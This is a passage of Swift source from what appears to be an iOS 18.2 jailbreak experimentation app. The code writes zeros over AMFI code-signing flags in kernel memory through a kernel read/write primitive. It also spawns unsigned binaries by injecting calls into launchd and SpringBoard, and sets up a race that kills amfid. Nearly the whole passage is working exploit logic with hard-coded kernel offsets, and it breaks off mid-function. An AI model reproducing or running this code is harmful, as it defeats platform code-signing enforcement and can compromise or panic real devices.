                }
                proofContent = String(bytes: bytes, encoding: .utf8) ?? ""
                detail += "Proof file EXISTS! Content: \"\(proofContent)\"\n"
                detail += "Size: \(nread) bytes\n\n"
            } else {
                detail += "Proof file exists but empty (nread=\(nread))\n\n"
            }
        } else {
            detail += "Proof file NOT FOUND ❌\n\n"

            // Also try: maybe the binary didn't run, try posix_spawn
            detail += "--- Retry with posix_spawn ---\n"
            let pidAddr = mem + 0x480
            rc[pidAddr].setValue32(0)
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPathAddr, 0, 0, argvBase, 0)
            let spawnPid = rc[pidAddr].value32()
            detail += "posix_spawn: ret=\(spawnRet), pid=\(spawnPid)\n"

            if spawnRet == 0 && spawnPid != 0 {
                RootExecutor.rcall(rc, "usleep", 200000)
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid), statusAddr, 0)
                let st = rc[statusAddr].value32()
                detail += "posix_spawn child: signal=\(st & 0x7F), code=\(st >> 8)\n"
            }
            detail += "\n"

            // Check proof again
            let proofFd2 = RootExecutor.rcall(rc, "open", proofPathAddr, UInt64(O_RDONLY), 0)
            if proofFd2 != UInt64(bitPattern: -1) {
                let readBuf2 = mem + 0x1000
                let nread2 = RootExecutor.rcall(rc, "read", proofFd2, readBuf2, 256)
                RootExecutor.rcall(rc, "close", proofFd2)
                if nread2 > 0 {
                    var bytes: [UInt8] = []
                    for i: UInt64 in 0..<min(nread2, 256) {
                        let b = rc[readBuf2 + i].value8()
                        if b == 0 { break }
                        bytes.append(b)
                    }
                    proofContent = String(bytes: bytes, encoding: .utf8) ?? ""
                    detail += "Proof file (after posix_spawn): \"\(proofContent)\"\n\n"
                }
            } else {
                detail += "Still no proof file after posix_spawn.\n\n"
            }
        }

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"

        let jailbroken = proofContent.contains("JAILBROKEN")

        if jailbroken {
            detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
            detail += "🎉  FULL JAILBREAK — ARBITRARY CODE EXEC!  🎉\n"
            detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
            detail += "Custom binary created /var/tmp/.jb_proof with content!\n"
            detail += "This proves: we can write AND execute arbitrary ARM64 code.\n\n"
            detail += "=== WHAT THIS MEANS ===\n"
            detail += "• No code signing enforcement for binaries spawned from launchd\n"
            detail += "• Can execute ANY payload (dpkg, ssh, custom tools)\n"
            detail += "• iOS 18.2 iPhone XR — JAILBROKEN\n"
        } else if childSignal == 0 && childCode == 0 {
            detail += "✅ Binary ran (exit 0, no SIGKILL) but proof file missing.\n\n"
            detail += "Possible causes:\n"
            detail += "  1. Mach-O structure issue — dyld loads but code doesn't execute properly\n"
            detail += "  2. ADR offset wrong — string address incorrect\n"
            detail += "  3. Syscall numbers different on iOS 18\n"
            detail += "  4. fork() in RC doesn't actually fork — child code runs in parent\n\n"
            detail += "Key insight: NO SIGKILL = AMFI is NOT blocking execution!\n"
            detail += "Fix the binary structure and we have full jailbreak.\n"
        } else if childSignal == 9 {
            detail += "❌ SIGKILL — AMFI blocked custom binary execution.\n"
            detail += "fork+execve from launchd does NOT bypass AMFI for truly unsigned code.\n"
        } else if childSignal == 4 || childSignal == 10 || childSignal == 11 {
            detail += "⚠️ Binary crashed: signal=\(childSignal) "
            if childSignal == 4 { detail += "(SIGILL — illegal instruction)\n" }
            else if childSignal == 10 { detail += "(SIGBUS — bus error)\n" }
            else { detail += "(SIGSEGV — segfault)\n" }
            detail += "Mach-O loaded but code has bug. Fix ARM64 assembly.\n"
            detail += "AMFI did NOT block — this is a code issue, not security issue!\n"
        } else {
            detail += "⚠️ Unexpected result: signal=\(childSignal), code=\(childCode)\n"
        }

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPathAddr)
        RootExecutor.rcall(rc, "unlink", proofPathAddr)
        RootExecutor.rcall(rc, "free", dstPathAddr)
        RootExecutor.rcall(rc, "free", proofPathAddr)

        return ExperimentResult(name: expName, success: jailbroken || (childSignal == 0 && childCode == 0), detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93f: posix_spawn Definitive (flags ON vs OFF)

    /// Exp 93f: The REAL test. fork() via RC is broken (child never execve's).
    /// Only posix_spawn actually launches a new process from RC context.
    /// Compare posix_spawn result WITH vs WITHOUT AMFI flags disabled.
    /// If ret changes from non-zero to 0 → AMFI flags control enforcement.
    private func runExp93fSpawnTest() {
        isRunning = true
        runningLabel = "Spawn Test"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93f_spawn_test") { rc in
            let result = self.expSpawnTest(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expSpawnTest(rc: RemoteCall) -> ExperimentResult {
        let expName = "Spawn Test (Exp 93f)"
        var detail = "Experiment 93f: posix_spawn — Flags ON vs OFF\n"
        detail += "===============================================\n\n"
        detail += "KEY INSIGHT: fork()+execve via RC is BROKEN.\n"
        detail += "Child never actually execve's — RC stays in parent.\n"
        detail += "Only posix_spawn creates a real new process.\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        let mem = rc.trojanMem

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        // ============================================================
        // Step 1: Prepare test binaries
        // ============================================================
        detail += "=== Step 1: Prepare binaries ===\n"

        // A) Copy /usr/libexec/amfid to /var/tmp (trusted CDHash)
        let trustedSrc = "/usr/libexec/amfid"
        let trustedDst = "/var/tmp/.exp93f_trusted"
        let unsignedDst = "/var/tmp/.exp93f_unsigned"
        let proofPath = "/var/tmp/.jb_proof"

        let srcAddr = remote_alloc_str(rc, trustedSrc)
        let trustedDstAddr = remote_alloc_str(rc, trustedDst)
        let unsignedDstAddr = remote_alloc_str(rc, unsignedDst)
        let proofAddr = remote_alloc_str(rc, proofPath)

        // Clean up old files
        RootExecutor.rcall(rc, "unlink", trustedDstAddr)
        RootExecutor.rcall(rc, "unlink", unsignedDstAddr)
        RootExecutor.rcall(rc, "unlink", proofAddr)

        // Copy amfid → trusted copy (same CDHash = should pass AMFI)
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        guard srcFd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot open \(trustedSrc)\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let dstFd1 = RootExecutor.rcall(rc, "open", trustedDstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        let buf = mem + 0x800
        var totalCopied: UInt64 = 0
        for _ in 0..<256 {
            let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
            if n == 0 || n == UInt64(bitPattern: -1) { break }
            RootExecutor.rcall(rc, "write", dstFd1, buf, n)
            totalCopied += n
            if n < 4096 { break }
        }
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd1)
        RootExecutor.rcall(rc, "chmod", trustedDstAddr, 0o755)
        detail += "Copied \(trustedSrc) → \(trustedDst) (\(totalCopied) bytes)\n"

        // B) Copy again but patch 1 byte → unsigned (different CDHash)
        let srcFd2 = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        let dstFd2 = RootExecutor.rcall(rc, "open", unsignedDstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        var totalCopied2: UInt64 = 0
        for _ in 0..<256 {
            let n = RootExecutor.rcall(rc, "read", srcFd2, buf, 4096)
            if n == 0 || n == UInt64(bitPattern: -1) { break }
            RootExecutor.rcall(rc, "write", dstFd2, buf, n)
            totalCopied2 += n
            if n < 4096 { break }
        }
        RootExecutor.rcall(rc, "close", srcFd2)
        RootExecutor.rcall(rc, "close", dstFd2)

        // Patch byte to invalidate CDHash
        let patchFd = RootExecutor.rcall(rc, "open", unsignedDstAddr, UInt64(O_RDWR), 0)
        if patchFd != UInt64(bitPattern: -1) {
            // Patch at offset 0x100 (well into __TEXT, will change CDHash)
            RootExecutor.rcall(rc, "lseek", patchFd, 0x100, 0)
            rc[buf].setValue8(0xFF)
            RootExecutor.rcall(rc, "write", patchFd, buf, 1)
            RootExecutor.rcall(rc, "close", patchFd)
        }
        RootExecutor.rcall(rc, "chmod", unsignedDstAddr, 0o755)
        detail += "Copied + patched → \(unsignedDst) (\(totalCopied2) bytes, CDHash INVALID)\n\n"

        // ============================================================
        // Step 2: posix_spawn tests — FLAGS ON (baseline)
        // ============================================================
        detail += "=== Step 2: posix_spawn baseline (flags ON) ===\n\n"

        // Test A: spawn trusted copy
        let (retA, pidA, errA) = doSpawn(rc: rc, path: trustedDst, mem: mem)
        detail += "[A] posix_spawn(\(trustedDst)):\n"
        detail += "    ret=\(retA), pid=\(pidA), errno=\(errA)\n"
        if retA == 0 && pidA != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidA, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // Test B: spawn unsigned copy
        let (retB, pidB, errB) = doSpawn(rc: rc, path: unsignedDst, mem: mem)
        detail += "[B] posix_spawn(\(unsignedDst)):\n"
        detail += "    ret=\(retB), pid=\(pidB), errno=\(errB)\n"
        if retB == 0 && pidB != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidB, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // Test C: spawn original amfid path
        let (retC, pidC, errC) = doSpawn(rc: rc, path: trustedSrc, mem: mem)
        detail += "[C] posix_spawn(\(trustedSrc)):\n"
        detail += "    ret=\(retC), pid=\(pidC), errno=\(errC)\n"
        if retC == 0 && pidC != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidC, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // ============================================================
        // Step 3: Disable AMFI flags
        // ============================================================
        detail += "=== Step 3: Disable AMFI flags ===\n"
        var originalValues: [(offset: UInt64, value: UInt64)] = []
        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            originalValues.append((off, val))
            ds_kwrite64(addr, 0)
        }
        detail += "All 10 flags set to 0\n\n"

        // ============================================================
        // Step 4: posix_spawn tests — FLAGS OFF
        // ============================================================
        detail += "=== Step 4: posix_spawn (flags OFF) ===\n\n"

        // Test D: spawn trusted copy (flags off)
        let (retD, pidD, errD) = doSpawn(rc: rc, path: trustedDst, mem: mem)
        detail += "[D] posix_spawn(\(trustedDst), flags OFF):\n"
        detail += "    ret=\(retD), pid=\(pidD), errno=\(errD)\n"
        if retD == 0 && pidD != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidD, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // Test E: spawn UNSIGNED copy (flags off) — THE KEY TEST
        let (retE, pidE, errE) = doSpawn(rc: rc, path: unsignedDst, mem: mem)
        detail += "[E] posix_spawn(\(unsignedDst), flags OFF):\n"
        detail += "    ret=\(retE), pid=\(pidE), errno=\(errE)\n"
        var unsignedExecOK = false
        if retE == 0 && pidE != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidE, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
            if sig != 9 { unsignedExecOK = true }
        }
        detail += "\n"

        // Test F: spawn original path (flags off)
        let (retF, pidF, errF) = doSpawn(rc: rc, path: trustedSrc, mem: mem)
        detail += "[F] posix_spawn(\(trustedSrc), flags OFF):\n"
        detail += "    ret=\(retF), pid=\(pidF), errno=\(errF)\n"
        if retF == 0 && pidF != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidF, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // ============================================================
        // Step 5: Restore flags
        // ============================================================
        detail += "=== Step 5: Restore flags ===\n"
        for (off, origVal) in originalValues {
            ds_kwrite64(amfiDataSlid &+ off, origVal)
        }
        detail += "Restored\n\n"

        // Cleanup
        RootExecutor.rcall(rc, "unlink", trustedDstAddr)
        RootExecutor.rcall(rc, "unlink", unsignedDstAddr)
        RootExecutor.rcall(rc, "unlink", proofAddr)
        RootExecutor.rcall(rc, "free", srcAddr)
        RootExecutor.rcall(rc, "free", trustedDstAddr)
        RootExecutor.rcall(rc, "free", unsignedDstAddr)
        RootExecutor.rcall(rc, "free", proofAddr)

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"
        detail += "Summary:\n"
        detail += "  Trusted copy (flags ON):  ret=\(retA)\n"
        detail += "  Unsigned copy (flags ON): ret=\(retB)\n"
        detail += "  Trusted copy (flags OFF): ret=\(retD)\n"
        detail += "  Unsigned copy (flags OFF): ret=\(retE)\n\n"

        if retB != 0 && retE == 0 && unsignedExecOK {
            detail += "🎉🎉🎉 JAILBREAK CONFIRMED! 🎉🎉🎉\n\n"
            detail += "Unsigned binary BLOCKED with flags ON (ret=\(retB))\n"
            detail += "Unsigned binary ALLOWED with flags OFF (ret=\(retE))!\n"
            detail += "AMFI flags control code signing enforcement!\n"
        } else if retA != 0 && retD == 0 {
            detail += "⚠️ Flags affect trusted binary spawn too.\n"
            detail += "posix_spawn fails for ALL binaries in /var/tmp (flags ON)\n"
            detail += "but works with flags OFF. Flags control spawn permission.\n"
            if retE == 0 {
                detail += "\n🎉 AND unsigned binary also works with flags OFF!\n"
            }
        } else if retA != 0 && retB != 0 && retD != 0 && retE != 0 {
            detail += "❌ posix_spawn fails for ALL cases.\n"
            detail += "ret=\(retA)/\(retB)/\(retD)/\(retE)\n"
            detail += "posix_spawn from launchd RC has a fundamental issue.\n"
            detail += "Might need posix_spawnattr or different approach.\n\n"
            detail += "NOTE: This doesn't mean AMFI blocks — posix_spawn\n"
            detail += "might fail for other reasons (sandbox, path, attrs).\n"
        } else if retA == 0 && retB == 0 {
            detail += "⚠️ BOTH trusted and unsigned work with flags ON!\n"
            detail += "AMFI doesn't block copied binaries from /var/tmp.\n"
            detail += "The CDHash patch might not actually change the hash\n"
            detail += "(patch at wrong offset?), OR launchd bypasses AMFI.\n"
        } else {
            detail += "Mixed results — need more analysis.\n"
            detail += "Trusted ON=\(retA), Unsigned ON=\(retB)\n"
            detail += "Trusted OFF=\(retD), Unsigned OFF=\(retE)\n"
        }

        return ExperimentResult(name: expName, success: (retE == 0 && retB != 0) || unsignedExecOK, detail: detail, timestamp: Date())
    }

    /// Helper: posix_spawn and return (ret, pid, errno)
    private func doSpawn(rc: RemoteCall, path: String, mem: UInt64) -> (Int64, UInt32, Int32) {
        let pathAddr = remote_alloc_str(rc, path)
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(pathAddr)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x480
        rc[pidAddr].setValue32(0)

        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        let err = remote_errno(rc)

        RootExecutor.rcall(rc, "free", pathAddr)
        return (Int64(bitPattern: ret), pid, err)
    }

    /// Helper: waitpid and return (signal, exitcode)
    private func doWait(rc: RemoteCall, pid: UInt32, mem: UInt64) -> (Int32, Int32) {
        let statusAddr = mem + 0x490
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
        let st = rc[statusAddr].value32()
        return (Int32(st & 0x7F), Int32(st >> 8))
    }

    // MARK: - Exp 93g: Multi-Path + SpringBoard Spawn

    /// Exp 93g: posix_spawn fails from /var/tmp via launchd (EPERM).
    /// Test: 1) different paths, 2) SpringBoard RC, 3) symlink from trusted path
    private func runExp93gMultiSpawn() {
        isRunning = true
        runningLabel = "Multi Spawn"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93g_multi_spawn") { rc in
            let result = self.expMultiSpawn(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expMultiSpawn(rc: RemoteCall) -> ExperimentResult {
        let expName = "Multi Spawn (Exp 93g)"
        var detail = "Experiment 93g: Multi-Path + SpringBoard Spawn\n"
        detail += "================================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        let mem = rc.trojanMem

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        // ============================================================
        // Step 1: Copy amfid to multiple paths
        // ============================================================
        detail += "=== Step 1: Copy binary to various paths ===\n"

        let srcPath = "/usr/libexec/amfid"
        let testPaths = [
            "/var/tmp/.exp93g",
            "/var/root/.exp93g",
            "/var/mobile/.exp93g",
            "/var/containers/Bundle/.exp93g",
            "/private/var/tmp/.exp93g",
            "/tmp/.exp93g",
        ]

        let srcAddr = remote_alloc_str(rc, srcPath)
        let buf = mem + 0x800

        // Read source once into memory
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        guard srcFd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot open \(srcPath)\n"
            RootExecutor.rcall(rc, "free", srcAddr)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        let fileSize = RootExecutor.rcall(rc, "lseek", srcFd, 0, 2)
        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0)
        detail += "Source: \(srcPath) (\(fileSize) bytes)\n\n"

        var successPaths: [String] = []

        for path in testPaths {
            let dstAddr = remote_alloc_str(rc, path)
            RootExecutor.rcall(rc, "unlink", dstAddr)

            let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            if dstFd == UInt64(bitPattern: -1) {
                detail += "  \(path): create FAIL ❌\n"
                RootExecutor.rcall(rc, "free", dstAddr)
                continue
            }

            // Copy from source (rewind source each time)
            RootExecutor.rcall(rc, "lseek", srcFd, 0, 0)
            var copied: UInt64 = 0
            for _ in 0..<256 {
                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
                if n == 0 || n == UInt64(bitPattern: -1) { break }
                RootExecutor.rcall(rc, "write", dstFd, buf, n)
                copied += n
                if n < 4096 { break }
            }
            RootExecutor.rcall(rc, "close", dstFd)
            RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)

            if copied > 0 {
                detail += "  \(path): copied ✅ (\(copied) bytes)\n"
                successPaths.append(path)
            } else {
                detail += "  \(path): copy failed ❌\n"
            }
            RootExecutor.rcall(rc, "free", dstAddr)
        }
        RootExecutor.rcall(rc, "close", srcFd)
        detail += "\n"

        // ============================================================
        // Step 2: posix_spawn from launchd — test all paths
        // ============================================================
        detail += "=== Step 2: posix_spawn from LAUNCHD ===\n\n"

        var launchdResults: [(path: String, ret: Int64, pid: UInt32)] = []

        for path in successPaths {
            let (ret, pid, err) = doSpawn(rc: rc, path: path, mem: mem)
            detail += "  \(path):\n    ret=\(ret), pid=\(pid), errno=\(err)"
            if ret == 0 && pid != 0 {
                let (sig, code) = doWait(rc: rc, pid: pid, mem: mem)
                detail += ", signal=\(sig), code=\(code)"
                if sig == 9 { detail += " (SIGKILL)" }
            }
            detail += "\n"
            launchdResults.append((path, ret, pid))
        }

        // Also test original path
        let (retOrig, pidOrig, errOrig) = doSpawn(rc: rc, path: srcPath, mem: mem)
        detail += "  \(srcPath) (original):\n    ret=\(retOrig), pid=\(pidOrig), errno=\(errOrig)"
        if retOrig == 0 && pidOrig != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidOrig, mem: mem)
            detail += ", signal=\(sig), code=\(code)"
        }
        detail += "\n\n"

        // ============================================================
        // Step 3: posix_spawn from SPRINGBOARD
        // ============================================================
        detail += "=== Step 3: posix_spawn from SPRINGBOARD ===\n\n"

        var sbResults: [(path: String, ret: Int64, pid: UInt32)] = []

        if let sb = dspmgr.shared.sbProc {
            let sbMem = sb.trojanMem

            for path in successPaths {
                let (ret, pid, err) = doSpawn(rc: sb, path: path, mem: sbMem)
                detail += "  \(path):\n    ret=\(ret), pid=\(pid), errno=\(err)"
                if ret == 0 && pid != 0 {
                    let (sig, code) = doWait(rc: sb, pid: pid, mem: sbMem)
                    detail += ", signal=\(sig), code=\(code)"
                    if sig == 9 { detail += " (SIGKILL)" }
                }
                detail += "\n"
                sbResults.append((path, ret, pid))
            }

            // Original path from SB
            let (retSBOrig, pidSBOrig, errSBOrig) = doSpawn(rc: sb, path: srcPath, mem: sbMem)
            detail += "  \(srcPath) (original):\n    ret=\(retSBOrig), pid=\(pidSBOrig), errno=\(errSBOrig)"
            if retSBOrig == 0 && pidSBOrig != 0 {
                let (sig, code) = doWait(rc: sb, pid: pidSBOrig, mem: sbMem)
                detail += ", signal=\(sig), code=\(code)"
            }
            detail += "\n"
        } else {
            detail += "  ❌ No SpringBoard RC available\n"
        }
        detail += "\n"

        // ============================================================
        // Step 4: Disable AMFI flags + retry best path from SB
        // ============================================================
        detail += "=== Step 4: Disable AMFI flags + retry ===\n"

        var originalValues: [(offset: UInt64, value: UInt64)] = []
        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            originalValues.append((off, val))
            ds_kwrite64(addr, 0)
        }
        detail += "Flags disabled: 10/10\n\n"

        // Retry from launchd
        detail += "--- Launchd (flags OFF) ---\n"
        for path in successPaths {
            let (ret, pid, err) = doSpawn(rc: rc, path: path, mem: mem)
            detail += "  \(path): ret=\(ret), pid=\(pid), errno=\(err)"
            if ret == 0 && pid != 0 {
                let (sig, code) = doWait(rc: rc, pid: pid, mem: mem)
                detail += ", sig=\(sig), code=\(code)"
                if sig == 9 { detail += " SIGKILL" }
                else if sig == 0 { detail += " ✅ NO SIGKILL" }
            }
            detail += "\n"
        }
        detail += "\n"

        // Retry from SpringBoard
        var sbFlagsOffSuccess = false
        detail += "--- SpringBoard (flags OFF) ---\n"
        if let sb = dspmgr.shared.sbProc {
            let sbMem = sb.trojanMem
            for path in successPaths {
                let (ret, pid, err) = doSpawn(rc: sb, path: path, mem: sbMem)
                detail += "  \(path): ret=\(ret), pid=\(pid), errno=\(err)"
                if ret == 0 && pid != 0 {
                    let (sig, code) = doWait(rc: sb, pid: pid, mem: sbMem)
                    detail += ", sig=\(sig), code=\(code)"
                    if sig != 9 { sbFlagsOffSuccess = true; detail += " ✅ NO SIGKILL" }
                    if sig == 9 { detail += " SIGKILL" }
                }
                detail += "\n"
            }

            // Also try original from SB with flags off
            let (retF, pidF, errF) = doSpawn(rc: sb, path: srcPath, mem: sbMem)
            detail += "  \(srcPath): ret=\(retF), pid=\(pidF), errno=\(errF)"
            if retF == 0 && pidF != 0 {
                let (sig, code) = doWait(rc: sb, pid: pidF, mem: sbMem)
                detail += ", sig=\(sig), code=\(code)"
                if sig != 9 { sbFlagsOffSuccess = true }
            }
            detail += "\n"
        }
        detail += "\n"

        // ============================================================
        // Step 5: Restore flags + cleanup
        // ============================================================
        detail += "=== Step 5: Restore + cleanup ===\n"
        for (off, origVal) in originalValues {
            ds_kwrite64(amfiDataSlid &+ off, origVal)
        }
        detail += "Flags restored\n"

        // Cleanup files
        for path in successPaths {
            let addr = remote_alloc_str(rc, path)
            RootExecutor.rcall(rc, "unlink", addr)
            RootExecutor.rcall(rc, "free", addr)
        }
        RootExecutor.rcall(rc, "free", srcAddr)
        detail += "Files cleaned\n\n"

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"

        let anyLaunchdWork = launchdResults.contains { $0.ret == 0 }
        let anySBWork = sbResults.contains { $0.ret == 0 }

        if sbFlagsOffSuccess {
            detail += "🎉 SpringBoard can spawn with AMFI flags OFF!\n"
            detail += "This might be the path to jailbreak.\n"
        } else if anySBWork {
            detail += "✅ SpringBoard can posix_spawn from some paths!\n"
            detail += "Next: test with UNSIGNED binary from SB.\n"
        } else if anyLaunchdWork {
            detail += "✅ Launchd can spawn from some paths.\n"
        } else {
            detail += "❌ posix_spawn fails from all tested paths.\n"
            detail += "Both launchd and SpringBoard blocked.\n\n"
            detail += "Remaining options:\n"
            detail += "  1. Use system() or popen() (resolves /bin/sh)\n"
            detail += "  2. Use NSTask/NSProcess from SB\n"
            detail += "  3. dlopen + function call (no new process)\n"
            detail += "  4. Patch amfid via kernel memory (physmap)\n"
        }

        return ExperimentResult(name: expName, success: anySBWork || sbFlagsOffSuccess, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 96: AMFI __DATA_CONST Write Test

    /// Exp 96: Test apakah AMFI __DATA_CONST juga writable (seperti __DATA).
    /// Kalau writable → kita bisa redirect mac_policy_ops function pointers
    /// ke gadget "MOV W0, #0; RET" → bypass SEMUA code signing → JAILBREAK.
    /// HASIL: PANIC — __DATA_CONST KTRR protected.
    private func runExp96DataConstWrite() {
        isRunning = true
        runningLabel = "DC Write"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        // DISABLED — causes kernel panic (KTRR fault)
        let result = ExperimentResult(
            name: "DATA_CONST Write (Exp 96)",
            success: false,
            detail: "❌ DISABLED — Exp 96 menyebabkan kernel panic.\n\n"
                + "AMFI __DATA_CONST (0xfffffff007b77a98) dilindungi KTRR.\n"
                + "Write ke situ = hardware fault = panic.\n\n"
                + "Hanya AMFI __DATA (0x541 bytes) yang writable.\n"
                + "mac_policy_ops function pointers TIDAK bisa di-redirect.",
            timestamp: Date()
        )
        results.insert(result, at: 0)
        isRunning = false
        runningLabel = ""
    }

    // MARK: - Exp 97: amfid Process Patch (Kill + Race)

    /// Exp 97: Kill amfid → spawn binary dalam window sebelum amfid restart.
    /// ATAU: find amfid proc → patch cs_flags → allow unsigned.
    /// amfid di-restart otomatis oleh launchd (KeepAlive), tapi ada window ~100ms.
    private func runExp97AmfidRace() {
        isRunning = true
        runningLabel = "amfid Race"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp97_amfid_race") { rc in
            let result = self.expAmfidRace(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expAmfidRace(rc: RemoteCall) -> ExperimentResult {
        let expName = "amfid Race (Exp 97)"
        var detail = "Experiment 97: amfid Kill + Spawn Race\n"
        detail += "========================================\n\n"
        detail += "Strategy: kill amfid → posix_spawn dalam window\n"
        detail += "sebelum amfid restart. Tanpa amfid, kernel mungkin\n"
        detail += "skip signature validation atau default-allow.\n\n"

        let mem = rc.trojanMem

        // ============================================================
        // Step 1: Find amfid PID
        // ============================================================
        detail += "=== Step 1: Find amfid ===\n"

        // Find amfid proc via KRW
        let amfidProc = mgr.findProc(name: "amfid")
        if amfidProc != 0 {
            let amfidPid = ds_kread32_safe(amfidProc + UInt64(off_proc_p_pid))
            detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
            detail += "amfid PID: \(amfidPid)\n\n"
        } else {
            detail += "amfid proc not found via KRW, trying sysctl...\n"
        }

        // Also get PID via RC
        // Use kill(0, pid) to check if process exists, or just try known PIDs
        // amfid is usually low PID (< 100)
        var amfidPid: UInt32 = 0

        // Method: iterate procs to find amfid
        if amfidProc != 0 {
            amfidPid = ds_kread32_safe(amfidProc + UInt64(off_proc_p_pid))
        }

        if amfidPid == 0 {
            detail += "⚠️ Cannot find amfid PID — trying common range\n"
            // amfid is usually PID 40-80 on iOS
            for testPid: UInt64 in 30..<100 {
                let ret = RootExecutor.rcall(rc, "kill", testPid, 0)  // signal 0 = check existence
                if ret == 0 {
                    // Process exists, but is it amfid? Hard to tell without procname
                    continue
                }
            }
        }

        guard amfidPid != 0 else {
            detail += "❌ Cannot find amfid PID\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ============================================================
        // Step 2: Prepare binary to spawn
        // ============================================================
        detail += "=== Step 2: Prepare binary ===\n"

        // Copy amfid to /var/containers/Bundle/ (path that allows spawn)
        let srcPath = "/usr/libexec/amfid"
        let dstPath = "/var/containers/Bundle/.exp97_test"
        let srcAddr = remote_alloc_str(rc, srcPath)
        let dstAddr = remote_alloc_str(rc, dstPath)

        RootExecutor.rcall(rc, "unlink", dstAddr)
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)

